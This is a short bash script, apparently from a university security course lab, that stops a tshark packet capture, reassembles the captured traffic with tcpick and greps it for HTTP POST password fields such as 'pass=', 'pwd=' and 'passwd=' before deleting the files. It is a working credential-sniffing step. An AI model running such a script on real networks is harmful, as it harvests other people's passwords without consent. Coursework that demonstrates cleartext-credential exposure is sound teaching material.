#!/bin/bash
#============================================================
# A simple shell script to stop tshark and process pcap file
# Attempts to print out http-post password
# ----
# Note: Run this script with sudo privilege
#============================================================

FILE=/var/www/html/cs3235/scripts/capture-output.pcapng
PCAP_FILE=/var/www/html/cs3235/scripts/packets.txt

# Stop tshark
#pid=$(ps -e | pgrep tshark)
#sudo kill -9 $pid
for pid in $(ps -e | pgrep tshark); do kill -9 $pid; done

# Process pcap file created
tcpick -C -yU -r $FILE >> $PCAP_FILE
#grep -F "usr" $PCAP_FILE
grep -F "pass=" $PCAP_FILE
grep -F "password=" $PCAP_FILE
grep -F "pwd=" $PCAP_FILE
grep -F "password2=" $PCAP_FILE
grep -F "pw=" $PCAP_FILE
grep -F "passwd=" $PCAP_FILE
grep -F "=secret" $PCAP_FILE

# Remove files created
rm $FILE
rm $PCAP_FILE

